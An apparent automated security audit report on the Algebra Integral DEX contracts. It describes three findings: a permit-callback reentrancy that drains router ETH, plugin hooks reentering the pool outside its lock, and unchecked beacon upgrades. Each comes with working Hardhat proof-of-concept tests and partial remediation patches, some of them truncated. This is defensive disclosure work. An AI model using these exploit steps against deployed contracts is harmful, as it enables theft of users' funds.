```
            }
```
### `src/periphery/contracts/base/PeripheryPayments.sol`
#### Lines 45-67 — _`refundNativeToken` transfers the complete native balance to its immediate caller; `pay` can use a token transfer path if native funding is unavailable._ — _The refund transfers all router ETH to its immediate caller without operation binding._ — _`refundNativeToken` sends the entire native balance to the reentrant caller, and `pay` falls back to `transferFrom` when the native balance is insufficient._

```
function refundNativeToken() external payable override {
    if (address(this).balance > 0) TransferHelper.safeTransferNative(msg.sender, address(this).balance);
}

function pay(address token, address payer, address recipient, uint256 value) internal {
    if (token == WNativeToken && address(this).balance >= value) {
        IWNativeToken(WNativeToken).deposit{value: value}();
        IWNativeToken(WNativeToken).transfer(recipient, value);
    } else if (payer == address(this)) {
        TransferHelper.safeTransfer(token, recipient, value);
    } else {
        TransferHelper.safeTransferFrom(token, payer, recipient, value);
    }
}
```
### `src/periphery/contracts/SwapRouter.sol` (2 locations)
#### Lines 22-28 — _SwapRouter composes the vulnerable Multicall and SelfPermit surfaces._

```
contract SwapRouter is
    ISwapRouter,
    PeripheryImmutableState,
    PeripheryValidation,
    PeripheryPaymentsWithFee,
    Multicall,
    SelfPermit
```
⋯
#### Lines 109-119 — _A payable exact-input route can proceed after the native balance has been drained, provided its payment path can use an existing allowance._

```
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable override checkDeadline(params.deadline) returns (uint256 amountOut) {
        amountOut = exactInputInternal(
            params.amountIn,
            params.recipient,
            params.limitSqrtPrice,
            SwapCallbackData({path: abi.encodePacked(params.tokenIn, params.deployer, params.tokenOut), payer: msg.sender})
        );
        require(amountOut >= params.amountOutMinimum, 'Too little received');
    }
```
## Description

The permit helpers call a caller-selected token's `permit` implementation while execution remains within the router's payable multicall flow. A malicious permit token can reenter the router from that external call and invoke the public `refundNativeToken` function. Because `refundNativeToken` transfers `address(this).balance` to its immediate caller, the callback can receive the entire native balance held by the router, including the outer batch's attached value. `Multicall` uses `delegatecall`, so later batch items still execute against the same router context after the callback returns. In payment flows using `pay`, insufficient native balance can cause execution to use a token transfer path instead, so a later route may complete while the attached native value has already been redirected. The same unguarded callback window exists in both `selfPermit` and `selfPermitAllowed`.
## Root cause

Caller-controlled `permit` calls are unguarded against reentrancy while `refundNativeToken` exposes the router's aggregate native balance to the callback caller.
## Impact

A user who includes a callback-capable permit token before a native-funded swap, position action, or similar batch operation can have the batch's attached native value transferred to the malicious token contract. The callback can also take other native funds held by the router at that moment, and the intended operation may either fail or continue using an existing wrapped-native-token allowance.
## Proof of concept
### Test case

```
import { MaxUint256, ZeroAddress } from 'ethers';
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';

import completeFixture from './shared/completeFixture';
import { FeeAmount, TICK_SPACINGS } from './shared/constants';
import { encodePriceSqrt } from './shared/encodePriceSqrt';
import { expect } from './shared/expect';
import { getMaxTick, getMinTick } from './shared/ticks';

describe('PoC: permit callback drains multicall native funds', function () {
  this.timeout(40_000);

  it('reenters from selfPermit, steals the router ETH balance, and the later WNative swap still succeeds via allowance', async () => {
    const [owner, trader] = await ethers.getSigners();
    const { factory, nft, router, tokens, wnative } = await loadFixture(completeFixture);
    const routerAddress = await router.getAddress();
    const wnativeAddress = await wnative.getAddress();
    const tokenAddress = await tokens[0].getAddress();
    const [mintToken0, mintToken1] = wnativeAddress.toLowerCase() < tokenAddress.toLowerCase()
      ? [wnativeAddress, tokenAddress]
      : [tokenAddress, wnativeAddress];

    await tokens[0].approve(await nft.getAddress(), MaxUint256);
    await wnative.deposit({ value: 1_000_000n });
    await wnative.approve(await nft.getAddress(), MaxUint256);

    await nft.createAndInitializePoolIfNecessary(mintToken0, mintToken1, encodePriceSqrt(1, 1));
    const tickLower = getMinTick(TICK_SPACINGS[FeeAmount.MEDIUM]);
    const tickUpper = getMaxTick(TICK_SPACINGS[FeeAmount.MEDIUM]);
    await nft.mint({
      token0: mintToken0,
      token1: mintToken1,
      deployer: ZeroAddress,
      tickLower,
      tickUpper,
      amount0Desired: 1_000_000,
      amount1Desired: 1_000_000,
      amount0Min: 0,
      amount1Min: 0,
      recipient: owner.address,
      deadline: 1,
    });

    const poolAddress = await factory.poolByPair(wnativeAddress, tokenAddress);
    expect(poolAddress).to.not.equal(ZeroAddress);

    await wnative.connect(trader).deposit({ value: 1_000_000n });
    await wnative.connect(trader).approve(routerAddress, MaxUint256);

    const maliciousFactory = await ethers.getContractFactory('MaliciousPermitRefundToken');
    const maliciousPermitToken = await maliciousFactory.deploy(routerAddress);
    const maliciousAddress = await maliciousPermitToken.getAddress();

    const attachedNativeValue = 10n ** 18n;
    const amountIn = 3n;
    const swapParams = {
      tokenIn: wnativeAddress,
      tokenOut: tokenAddress,
      deployer: ZeroAddress,
      fee: FeeAmount.MEDIUM,
      limitSqrtPrice: wnativeAddress.toLowerCase() < tokenAddress.toLowerCase()
        ? 4_295_128_740n
        : 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341n,
      recipient: trader.address,
      deadline: 1,
      amountIn,
      amountOutMinimum: 1,
    };

    const before = {
      maliciousEth: await ethers.provider.getBalance(maliciousAddress),
      routerEth: await ethers.provider.getBalance(routerAddress),
      traderWNative: await wnative.balanceOf(trader.address),
      traderToken: await tokens[0].balanceOf(trader.address),
      poolWNative: await wnative.balanceOf(poolAddress),
    };
    expect(before.routerEth).to.equal(0n);
    expect(before.maliciousEth).to.equal(0n);

    const data = [
      router.interface.encodeFunctionData('selfPermit', [
        maliciousAddress,
        0,
        0,
        0,
        ethers.ZeroHash,
        ethers.ZeroHash,
      ]),
      router.interface.encodeFunctionData('exactInputSingle', [swapParams]),
    ];

    await router.connect(trader).multicall(data, { value: attachedNativeValue });

    expect(await maliciousPermitToken.permitCalls()).to.equal(1n);
    expect(await maliciousPermitToken.receivedDuringPermit()).to.equal(attachedNativeValue);
    expect(await ethers.provider.getBalance(maliciousAddress)).to.equal(before.maliciousEth + attachedNativeValue);
    expect(await ethers.provider.getBalance(routerAddress)).to.equal(0n);

    // The later public router entry point still completed: with native ETH already stolen,
    // PeripheryPayments.pay fell through to WNative.transferFrom using the trader's allowance.
    expect(await wnative.balanceOf(trader.address)).to.equal(before.traderWNative - amountIn);
    expect(await wnative.balanceOf(poolAddress)).to.equal(before.poolWNative + amountIn);
    expect(await tokens[0].balanceOf(trader.address)).to.be.gt(before.traderToken);
  });
});
```

### Considerations

PoC executed successfully with strategyId `unit:cryptoalgebra-integral-periphery` using the real `MockTimeSwapRouter` inheriting production `SwapRouter`, `Multicall`, `SelfPermit`, and `PeripheryPayments`. The passing test calls `router.multicall([selfPermit(maliciousToken), exactInputSingle(...)], { value: 1 ether })`; the malicious permit callback reenters `refundNativeToken`, receives the full attached native balance, and the subsequent WNative exact-input swap still completes via the trader's pre-existing WNative allowance. The test demonstrates the EIP-2612-style `selfPermit` path; `selfPermitAllowed` has the same external callback shape but was not separately executed.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Adds a shared permit-callback guard: every permit variant holds the guard across caller-selected token calls, while native refunds reject calls during that window. Internal helpers avoid nested guard failures in the conditional permit variants and preserve normal multicall refund behavior after permit completion.
### Patch

```diff
+/// @dev Shared guard for payment functions that must not be callable from a token permit callback.
+abstract contract SelfPermitCallContext {
```

## Description

The pool invokes externally implemented plugin hooks outside its reentrancy-protected interval. Position and swap pre-hooks, as well as `beforeFlash`, execute before `_lock()`, while initialization invokes its hooks without taking the lock at all. Conversely, the position, swap, and flash post-hooks execute only after `_unlock()`, including the prepaid swap path that records the caller's payment and reserves before temporarily unlocking for `beforeSwap`. Consequently, a configured plugin can call pool entry points during either callback boundary and interleave a second state transition with the operation that triggered the hook. The base plugin also forwards `afterSwap` to an external incentive through `crossTo`, allowing that incentive to recursively invoke `swap` and retrigger the same unlocked hook chain.
## Root cause

External plugin and incentive callbacks are executed before `_lock()`, after `_unlock()`, or without any lock, so `globalState.unlocked` does not enforce a reentrancy boundary across the callback lifecycle.
## Impact

A malicious, compromised, or faulty configured plugin or connected incentive can recursively reenter operations until gas or call-depth exhaustion, causing swaps or flashes to revert. It can also execute nested swaps, flashes, liquidity operations, or permitted configuration changes between phases of an outer operation, so the outer action proceeds against interleaved price, reserve, liquidity, or fee state.
## Proof of concept
### Test case

```
import { ethers } from 'hardhat';
import { MaxUint256 } from 'ethers';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { expect } from './shared/expect';
import { poolFixture } from './shared/fixtures';
import { createPoolFunctions, encodePriceSqrt, expandTo18Decimals, getMaxTick, getMinTick, MIN_SQRT_RATIO } from './shared/utilities';

describe('PoC: plugin hook can reenter the pool before swap lock', () => {
  async function initializedPool(fixture: Awaited<ReturnType<typeof poolFixture>>) {
    const pool = await fixture.createPool();
    await pool.initialize(encodePriceSqrt(1, 1));
    const tickSpacing = Number(await pool.tickSpacing());
    const minTick = getMinTick(tickSpacing);
    const maxTick = getMaxTick(tickSpacing);

    await fixture.token0.approve(fixture.swapTargetCallee, MaxUint256);
    await fixture.token1.approve(fixture.swapTargetCallee, MaxUint256);
    await fixture.swapTargetCallee.mint(pool, (await ethers.getSigners())[0].address, minTick, maxTick, expandTo18Decimals(1000));

    return pool;
  }

  it('executes a nested public swap from the beforeSwap plugin callback while the pool reports unlocked', async () => {
    const [wallet] = await ethers.getSigners();
    const fixture = await loadFixture(poolFixture);
    const amountIn = expandTo18Decimals(1);
    const limit = MIN_SQRT_RATIO + 1n;

    const controlPool = await initializedPool(fixture);
    await fixture.token0.approve(fixture.swapTargetCallee, MaxUint256);
    const controlToken1Before = await fixture.token1.balanceOf(wallet.address);
    await fixture.swapTargetCallee.swapExact0For1(controlPool, amountIn, wallet.address, limit);
    const controlToken1Out = (await fixture.token1.balanceOf(wallet.address)) - controlToken1Before;
    const controlTick = (await controlPool.globalState()).tick;

    const attackedPool = await initializedPool(fixture);
    const pluginFactory = await ethers.getContractFactory('ReentrantBeforeSwapPlugin');
    const plugin = await pluginFactory.deploy(attackedPool);

    await attackedPool.setPlugin(plugin);
    await attackedPool.setPluginConfig(1); // BEFORE_SWAP_FLAG
    await fixture.token0.transfer(plugin, amountIn * 2n);
    await plugin.armReentry(1, true, amountIn, limit, wallet.address);

    const attackToken1Before = await fixture.token1.balanceOf(wallet.address);
    await fixture.token0.approve(fixture.swapTargetCallee, MaxUint256);
    await fixture.swapTargetCallee.swapExact0For1(attackedPool, amountIn, wallet.address, limit);
    const attackToken1Out = (await fixture.token1.balanceOf(wallet.address)) - attackToken1Before;
    const attackedTick = (await attackedPool.globalState()).tick;

    expect(await plugin.unlockedObservationsBeforeReentry()).to.eq(1n);
    expect(await plugin.beforeSwapCalls()).to.eq(2n);
    expect(await plugin.callbackCalls()).to.eq(1n);
    expect(attackToken1Out).to.be.gt(controlToken1Out);
    expect(attackedTick).to.be.lt(controlTick);
  });
});
```

### Considerations

PoC executed successfully in the core Hardhat harness (`unit:cryptoalgebra-integral-core`). It proves the beforeSwap hook branch of the finding: a configured plugin observes `pool.isUnlocked() == true`, reenters the real `AlgebraPool.swap` public entry point once from `beforeSwap`, funds the nested swap through the real `algebraSwapCallback`, and leaves the attacked pool with strictly more token1 output and a lower final tick than an otherwise identical single-swap control pool. It does not separately demonstrate afterSwap, flash, initialization, mint/burn, payment-in-advance, or AlgebraBasePluginV1 incentive-recursion variants.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Hold the pool reentrancy lock continuously across initialization and all position, swap, prepaid-swap, and flash plugin pre/post hooks, while preserving the base plugin's intended ability to update its own hook configuration and dynamic fee during those callbacks; non-plugin configuration callers remain lock-gated.
### Patch

## Description

Both plugin factories deploy each plugin as a `BeaconProxy` using the factory itself as the shared beacon, so a beacon implementation change redirects every proxy in that factory's cohort. Their `_setImplementation` routines accept any address with nonzero `code.length` and do not establish that the replacement supports the required plugin ABI or remains compatible with already initialized proxy state. A replacement lacking expected hook selectors can cause calls delegated through existing proxies to revert, while a replacement that interprets storage differently can alter fee, oracle, farming, or pool-related behavior. The same issue also affects future plugin creation because `_createPlugin` delegates `initialize` and configuration calls through the mutable beacon implementation. Restricting upgrades to an authorized administrator or owner does not protect against an erroneous upgrade or compromised privileged credential; upgrades need an approved compatibility and migration process for each shared cohort.
## Root cause

`_setImplementation` treats nonempty runtime bytecode as sufficient for a shared beacon upgrade without enforcing approved plugin ABI, storage-layout, and initialized-state compatibility requirements.
## Impact

An erroneous or compromised privileged upgrade can simultaneously make plugin hook paths unavailable across all default or custom pools attached to the affected beacon, including swaps that call `beforeSwap`. It can also leave future plugin creation reverting if the selected implementation does not support the expected initialization path. Restoring service requires a later compatible upgrade, and storage-incompatible logic can make existing proxy state behave incorrectly before restoration.
## Proof of concept
### Test case

```
    expect(await customFactory.isCustomPool(customPool)).to.be.true;

    const pluginAddress = await customFactory.pluginByPool(customPool);
    expect(pluginAddress).to.not.eq(ZeroAddress);
    const customPlugin = pluginAbiFactory.attach(pluginAddress);
    expect((await customPlugin.feeConfig()).baseFee).to.be.gt(0);

    const badImplementationFactory = await ethers.getContractFactory('IncompatiblePluginImplementation');
    const badImplementation = await badImplementationFactory.deploy();

    await expect(customFactory.upgradeTo(await badImplementation.getAddress()))
      .to.emit(customFactory, 'Upgraded')
      .withArgs(await badImplementation.getAddress());
    expect(await customFactory.implementation()).to.eq(await badImplementation.getAddress());

    // Existing custom-pool plugin proxy is now redirected to code with no plugin ABI.
    await expect(customPlugin.feeConfig()).to.be.reverted;

    // Future custom-pool deployment reaches the real hook flow but reverts when _createPlugin
    // tries to initialize a BeaconProxy that now delegates to the incompatible implementation.
    const [nextToken0, nextToken1] = sortTokens(TEST_ADDRESSES[0], TEST_ADDRESSES[2]);
    await customFactory.setTokenWhitelist(TEST_ADDRESSES[2], true);
    const nextPool = await factory.computeCustomPoolAddress(await customFactory.getAddress(), nextToken0, nextToken1);

    await expect(customFactory.deployCustomPool(TEST_ADDRESSES[0], TEST_ADDRESSES[2], '0x')).to.be.reverted;
    expect(await customFactory.isCustomPool(nextPool)).to.be.false;
    expect(await customFactory.pluginByPool(nextPool)).to.eq(ZeroAddress);
  });
});
```

- `src/plugin/contracts/test/IncompatiblePluginImplementation.sol`

### Considerations

PoC executed successfully in `unit:cryptoalgebra-integral-base-plugin` with `npx hardhat test test/Poc.spec.ts`: 2 passing. It covers both real vulnerable factories: `BasePluginV1Factory.upgradeTo()` and `CustomPoolPluginFactory.upgradeTo()` accept a deployed `IncompatiblePluginImplementation`, update the shared beacon pointer, and redirect existing BeaconProxy plugins so normal `AlgebraBasePluginV1` ABI calls (`feeConfig`) revert. It also proves future plugin/custom-pool creation reverts after the poisoned beacon because `_createPlugin` calls `initialize`/configuration through the incompatible proxy. The PoC uses plugin ABI/creation failure as the concrete sink; it does not execute a live pool `swap`/`beforeSwap` hook path, although the same proxy selector redirection is what would affect pool hook calls when enabled.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Adds a versioned implementation compatibility identifier to the plugin ABI and requires both shared beacons to verify that identifier before changing their implementation pointer, rejecting arbitrary code-bearing contracts while preserving compatible derived upgrades and initialization behavior.
### Patch

```diff

+++ b/src/plugin/contracts/interfaces/IAlgebraBasePluginV1.sol

 import './plugins/IDynamicFeeManager.sol';
 import './plugins/IFarmingPlugin.sol';

 /// @notice This contract combines the standard implementations of the volatility oracle and the dynamic fee manager
 /// @dev This contract stores timepoints and calculates adaptive fee and statistical averages
 interface IAlgebraBasePluginV1 is IVolatilityOracle, IDynamicFeeManager, IFarmingPlugin {
+  /// @notice Identifies implementations compatible with this plugin proxy cohort
+  function pluginImplementationId() external pure returns (bytes32);
+
   /// @notice Initialize the plugin externally
   /// @dev This function allows to initialize the plugin if it was created after the pool was created
   function initialize() external;
 
   /// @notice Initialize the plugin instead of the constructor flow, for proxy
   /// @dev This function allows to initialize the plugin if it was created like proxy
   function initialize(address _pool, address _factory, address _pluginFactory) external;
 }

--- a/src/plugin/contracts/AlgebraBasePluginV1.sol

 // SPDX-License-Identifier: BUSL-1.1
 pragma solidity =0.8.20;
 
 import '@cryptoalgebra/integral-core/contracts/libraries/Plugins.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraFactory.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/plugin/IAlgebraPlugin.sol';

 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraPool.sol';
 
 import '@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol';
 
 import './base/TimestampUpgradeable.sol';
 import './interfaces/IAlgebraBasePluginV1.sol';
 import './interfaces/IBasePluginV1Factory.sol';
 import './interfaces/IAlgebraVirtualPool.sol';
 
 import './libraries/VolatilityOracle.sol';
 import './libraries/AdaptiveFee.sol';
 import './types/AlgebraFeeConfigurationU144.sol';
 
 /// @title Algebra Integral 1.0 default plugin
 /// @notice This contract stores timepoints and calculates adaptive fee and statistical averages
 contract AlgebraBasePluginV1 is IAlgebraBasePluginV1, IAlgebraPlugin, Initializable, TimestampUpgradeable {
   using Plugins for uint8;
   using AlgebraFeeConfigurationU144Lib for AlgebraFeeConfiguration;
 
+  bytes32 public constant override pluginImplementationId = keccak256('ALGEBRA_BASE_PLUGIN_V1');
+
   uint256 internal constant UINT16_MODULO = 65536;
   using VolatilityOracle for VolatilityOracle.Timepoint[UINT16_MODULO];
 
   /// @dev The role can be granted in AlgebraFactory
   bytes32 public constant ALGEBRA_BASE_PLUGIN_MANAGER = keccak256('ALGEBRA_BASE_PLUGIN_MANAGER');
 
   /// @inheritdoc IAlgebraPlugin
   uint8 public constant override defaultPluginConfig = uint8(Plugins.AFTER_INIT_FLAG | Plugins.BEFORE_SWAP_FLAG | Plugins.DYNAMIC_FEE);
 
   /// @inheritdoc IFarmingPlugin
   address public override pool;
   address private factory;
   address private pluginFactory;
 
   /// @inheritdoc IVolatilityOracle
   VolatilityOracle.Timepoint[UINT16_MODULO] public override timepoints;
 
   /// @inheritdoc IVolatilityOracle
   uint16 public override timepointIndex;
 
   /// @inheritdoc IVolatilityOracle
   uint32 public override lastTimepointTimestamp;
 
   /// @inheritdoc IVolatilityOracle
   bool public override isInitialized;
 
   /// @dev AlgebraFeeConfiguration struct packed in uint144
   AlgebraFeeConfigurationU144 private _feeConfig;
 
   /// @inheritdoc IFarmingPlugin
   address public override incentive;
 
   /// @dev the address which connected the last incentive. Needed so that he can disconnect it
   address private _lastIncentiveOwner;
 
   modifier onlyPool() {
     _checkIfFromPool();
     _;
   }
 
   constructor() {
     _disableInitializers();
   }
 
   /// @inheritdoc IAlgebraBasePluginV1
   function initialize(address _pool, address _factory, address _pluginFactory) external override initializer {
     (factory, pool, pluginFactory) = (_factory, _pool, _pluginFactory);
   }
 
   /// @inheritdoc IDynamicFeeManager
   function feeConfig()
     external
     view
     override
     returns (uint16 alpha1, uint16 alpha2, uint32 beta1, uint32 beta2, uint16 gamma1, uint16 gamma2, uint16 baseFee)
   {
     (alpha1, alpha2) = (_feeConfig.alpha1(), _feeConfig.alpha2());
     (beta1, beta2) = (_feeConfig.beta1(), _feeConfig.beta2());
     (gamma1, gamma2) = (_feeConfig.gamma1(), _feeConfig.gamma2());
     baseFee = _feeConfig.baseFee();
   }
 
   function _checkIfFromPool() internal view {
     require(msg.sender == pool, 'Only pool can call this');
   }
 
   function _getPoolState() internal view returns (uint160 price, int24 tick, uint16 fee, uint8 pluginConfig) {
     (price, tick, fee, pluginConfig, , ) = IAlgebraPoolState(pool).globalState();
   }
 
   function _getPluginInPool() internal view returns (address plugin) {
     return IAlgebraPool(pool).plugin();
   }
 
   /// @inheritdoc IAlgebraBasePluginV1
   function initialize() external override {
     require(!isInitialized, 'Already initialized');
     require(_getPluginInPool() == address(this), 'Plugin not attached');
     (uint160 price, int24 tick, , ) = _getPoolState();
     require(price != 0, 'Pool is not initialized');
 
     uint32 time = _blockTimestamp();
     timepoints.initialize(time, tick);
     lastTimepointTimestamp = time;
     isInitialized = true;
 
     _updatePluginConfigInPool();
   }
 
   // ###### Volatility and TWAP oracle ######
 
   /// @inheritdoc IVolatilityOracle
   function getSingleTimepoint(uint32 secondsAgo) external view override returns (int56 tickCumulative, uint88 volatilityCumulative) {
     // `volatilityCumulative` values for timestamps after the last timepoint _should not_ be compared: they may differ due to interpolation errors
     (, int24 tick, , ) = _getPoolState();
     uint16 lastTimepointIndex = timepointIndex;
     uint16 oldestIndex = timepoints.getOldestIndex(lastTimepointIndex);
     VolatilityOracle.Timepoint memory result = timepoints.getSingleTimepoint(_blockTimestamp(), secondsAgo, tick, lastTimepointIndex, oldestIndex);
     (tickCumulative, volatilityCumulative) = (result.tickCumulative, result.volatilityCumulative);
   }
 
   /// @inheritdoc IVolatilityOracle
   function getTimepoints(
     uint32[] memory secondsAgos
   ) external view override returns (int56[] memory tickCumulatives, uint88[] memory volatilityCumulatives) {
     // `volatilityCumulative` values for timestamps after the last timepoint _should not_ be compared: they may differ due to interpolation errors
     (, int24 tick, , ) = _getPoolState();
     return timepoints.getTimepoints(_blockTimestamp(), secondsAgos, tick, timepointIndex);
   }
 
   /// @inheritdoc IVolatilityOracle
   function prepayTimepointsStorageSlots(uint16 startIndex, uint16 amount) external override {
     require(!timepoints[startIndex].initialized); // if not initialized, then all subsequent ones too
     require(amount > 0 && type(uint16).max - startIndex >= amount);
 
     unchecked {
       for (uint256 i = startIndex; i < startIndex + amount; ++i) {
         timepoints[i].blockTimestamp = 1; // will be overwritten
       }
     }
   }
 
   // ###### Fee manager ######
 
   /// @inheritdoc IDynamicFeeManager
   function changeFeeConfiguration(AlgebraFeeConfiguration calldata _config) external override {
     require(msg.sender == pluginFactory || IAlgebraFactory(factory).hasRoleOrOwner(ALGEBRA_BASE_PLUGIN_MANAGER, msg.sender));
     AdaptiveFee.validateFeeConfiguration(_config);
 
     _feeConfig = _config.pack(); // pack struct to uint144 and write in storage
     emit FeeConfiguration(_config);
   }
 
   /// @inheritdoc IAlgebraDynamicFeePlugin
   function getCurrentFee() external view override returns (uint16 fee) {
     uint16 lastIndex = timepointIndex;
     AlgebraFeeConfigurationU144 feeConfig_ = _feeConfig;
     if (feeConfig_.alpha1() | feeConfig_.alpha2() == 0) return feeConfig_.baseFee();
 
     uint16 oldestIndex = timepoints.getOldestIndex(lastIndex);
     (, int24 tick, , ) = _getPoolState();
 
     uint88 volatilityAverage = timepoints.getAverageVolatility(_blockTimestamp(), tick, lastIndex, oldestIndex);
     return AdaptiveFee.getFee(volatilityAverage, feeConfig_);
   }
 
   function _getFeeAtLastTimepoint(
     uint16 lastTimepointIndex,
     uint16 oldestTimepointIndex,
     int24 currentTick,
     AlgebraFeeConfigurationU144 feeConfig_
   ) internal view returns (uint16 fee) {
     if (feeConfig_.alpha1() | feeConfig_.alpha2() == 0) return feeConfig_.baseFee();
 
     uint88 volatilityAverage = timepoints.getAverageVolatility(_blockTimestamp(), currentTick, lastTimepointIndex, oldestTimepointIndex);
     return AdaptiveFee.getFee(volatilityAverage, feeConfig_);
   }
 
   // ###### Farming plugin ######
 
   /// @inheritdoc IFarmingPlugin
   function setIncentive(address newIncentive) external override {
     bool toConnect = newIncentive != address(0);
     bool accessAllowed;
     if (toConnect) {
       accessAllowed = msg.sender == IBasePluginV1Factory(pluginFactory).farmingAddress();
     } else {
       // we allow the one who connected the incentive to disconnect it,
       // even if he no longer has the rights to connect incentives
       if (_lastIncentiveOwner != address(0)) accessAllowed = msg.sender == _lastIncentiveOwner;
       if (!accessAllowed) accessAllowed = msg.sender == IBasePluginV1Factory(pluginFactory).farmingAddress();
     }
     require(accessAllowed, 'Not allowed to set incentive');
 
     bool isPluginConnected = _getPluginInPool() == address(this);
     if (toConnect) require(isPluginConnected, 'Plugin not attached');
 
     address currentIncentive = incentive;
     require(currentIncentive != newIncentive, 'Already active');
     if (toConnect) require(currentIncentive == address(0), 'Has active incentive');
 
     incentive = newIncentive;
     emit Incentive(newIncentive);
 
     if (toConnect) {
       _lastIncentiveOwner = msg.sender; // write creator of this incentive
     } else {
       _lastIncentiveOwner = address(0);
     }
 
     if (isPluginConnected) {
       _updatePluginConfigInPool();
     }
   }
 
   /// @inheritdoc IFarmingPlugin
   function isIncentiveConnected(address targetIncentive) external view override returns (bool) {
     if (incentive != targetIncentive) return false;
     if (_getPluginInPool() != address(this)) return false;
     (, , , uint8 pluginConfig) = _getPoolState();
     if (!pluginConfig.hasFlag(Plugins.AFTER_SWAP_FLAG)) return false;
 
     return true;
   }
 
   // ###### HOOKS ######
 
   function beforeInitialize(address, uint160) external override onlyPool returns (bytes4) {
     _updatePluginConfigInPool();
     return IAlgebraPlugin.beforeInitialize.selector;
   }
 
   function afterInitialize(address, uint160, int24 tick) external override onlyPool returns (bytes4) {
     uint32 _timestamp = _blockTimestamp();
     timepoints.initialize(_timestamp, tick);
 
     lastTimepointTimestamp = _timestamp;
     isInitialized = true;
 
     IAlgebraPool(pool).setFee(_feeConfig.baseFee());
     return IAlgebraPlugin.afterInitialize.selector;
   }
 
   /// @dev unused
   function beforeModifyPosition(address, address, int24, int24, int128, bytes calldata) external override onlyPool returns (bytes4) {
     _updatePluginConfigInPool(); // should not be called, reset config
     return IAlgebraPlugin.beforeModifyPosition.selector;
   }
 
   /// @dev unused
   function afterModifyPosition(address, address, int24, int24, int128, uint256, uint256, bytes calldata) external override onlyPool returns (bytes4) {
     _updatePluginConfigInPool(); // should not be called, reset config
     return IAlgebraPlugin.afterModifyPosition.selector;
   }
 
   function beforeSwap(address, address, bool, int256, uint160, bool, bytes calldata) external override onlyPool returns (bytes4) {
     _writeTimepointAndUpdateFee();
     return IAlgebraPlugin.beforeSwap.selector;
   }
 
   function afterSwap(address, address, bool zeroToOne, int256, uint160, int256, int256, bytes calldata) external override onlyPool returns (bytes4) {
     address _incentive = incentive;
     if (_incentive != address(0)) {
       (, int24 tick, , ) = _getPoolState();
       IAlgebraVirtualPool(_incentive).crossTo(tick, zeroToOne);
     } else {
       _updatePluginConfigInPool(); // should not be called, reset config
     }
 
     return IAlgebraPlugin.afterSwap.selector;
   }
 
   /// @dev unused
   function beforeFlash(address, address, uint256, uint256, bytes calldata) external override onlyPool returns (bytes4) {
     _updatePluginConfigInPool(); // should not be called, reset config
     return IAlgebraPlugin.beforeFlash.selector;
   }
 
   /// @dev unused
   function afterFlash(address, address, uint256, uint256, uint256, uint256, bytes calldata) external override onlyPool returns (bytes4) {
     _updatePluginConfigInPool(); // should not be called, reset config
     return IAlgebraPlugin.afterFlash.selector;
   }
 
   function _updatePluginConfigInPool() internal {
     uint8 newPluginConfig = defaultPluginConfig;
     if (incentive != address(0)) {
       newPluginConfig |= uint8(Plugins.AFTER_SWAP_FLAG);
     }
 
     (, , , uint8 currentPluginConfig) = _getPoolState();
     if (currentPluginConfig != newPluginConfig) {
       IAlgebraPool(pool).setPluginConfig(newPluginConfig);
     }
   }
 
   function _writeTimepointAndUpdateFee() internal {
     // single SLOAD
     uint16 _lastIndex = timepointIndex;
     uint32 _lastTimepointTimestamp = lastTimepointTimestamp;
     AlgebraFeeConfigurationU144 feeConfig_ = _feeConfig; // struct packed in uint144
     bool _isInitialized = isInitialized;
     require(_isInitialized, 'Not initialized');
 
     uint32 currentTimestamp = _blockTimestamp();
 
     if (_lastTimepointTimestamp == currentTimestamp) return;
 
     (, int24 tick, uint16 fee, ) = _getPoolState();
     (uint16 newLastIndex, uint16 newOldestIndex) = timepoints.write(_lastIndex, currentTimestamp, tick);
 
     timepointIndex = newLastIndex;
     lastTimepointTimestamp = currentTimestamp;
 
     uint16 newFee = _getFeeAtLastTimepoint(newLastIndex, newOldestIndex, tick, feeConfig_);
     if (newFee != fee) {
       IAlgebraPool(pool).setFee(newFee);
     }
   }
 
   /**
    * @dev This empty reserved space is put in place to allow future versions to add new
    * variables without shifting down storage in the inheritance chain.
    * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
    */
   uint256[50] private __gap;
 }

 /// @title Algebra Integral 1.0 default plugin factory
 /// @notice This contract creates Algebra default plugins for Algebra liquidity pools
 contract BasePluginV1Factory is IBasePluginV1Factory {
   /// @inheritdoc IBasePluginV1Factory
   bytes32 public constant override ALGEBRA_BASE_PLUGIN_FACTORY_ADMINISTRATOR = keccak256('ALGEBRA_BASE_PLUGIN_FACTORY_ADMINISTRATOR');
 
   /// @inheritdoc IBasePluginV1Factory

   /// @inheritdoc IBasePluginV1Factory
   AlgebraFeeConfiguration public override defaultFeeConfiguration; // values of constants for sigmoids in fee calculation formula
 
   /// @inheritdoc IBasePluginV1Factory
   address public override farmingAddress;
 
   /// @inheritdoc IBeacon
   address public override implementation;
 
   /// @inheritdoc IBasePluginV1Factory
   mapping(address poolAddress => address pluginAddress) public override pluginByPool;
 
   modifier onlyAdministrator() {
     require(IAlgebraFactory(algebraFactory).hasRoleOrOwner(ALGEBRA_BASE_PLUGIN_FACTORY_ADMINISTRATOR, msg.sender), 'Only administrator');
     _;
   }
 
   constructor(address _algebraFactory, address _basePluginV1Implementation) {
     algebraFactory = _algebraFactory;
     defaultFeeConfiguration = AdaptiveFee.initialFeeConfiguration();
 
     _setImplementation(_basePluginV1Implementation);
 
     emit DefaultFeeConfiguration(defaultFeeConfiguration);
   }
 
   /// @inheritdoc IAlgebraPluginFactory
   function createPlugin(address pool, address, address) external override returns (address) {
     require(msg.sender == algebraFactory);
     return _createPlugin(pool);
   }
 
   /// @notice This factory does not support the custom pool creation hook flow.
   /// @dev BasePluginV1Factory was not developed for custom pool hooks. This implementation exists only to satisfy
   /// the updated IAlgebraPluginFactory interface, which includes hook methods for custom pool logic.
   function beforeCreatePoolHook(address, address, address, address, address, bytes calldata) external pure override returns (address) {
     revert('Hooks not supported');
   }
 
   /// @notice This factory does not support the custom pool creation hook flow.
